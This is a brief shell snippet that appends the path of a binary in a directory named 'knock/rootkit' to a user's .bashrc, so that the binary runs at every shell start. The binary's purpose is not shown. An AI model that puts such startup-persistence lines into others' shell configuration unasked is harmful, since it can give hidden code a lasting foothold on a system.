BASHRC="/home/kit/.bashrc"
PERSONALITY_CMD="/home/kit/knock/rootkit/bin/personality"
if ! grep -q "$PERSONALITY_CMD" "$BASHRC"; then
    echo "$PERSONALITY_CMD" >> "$BASHRC"
fi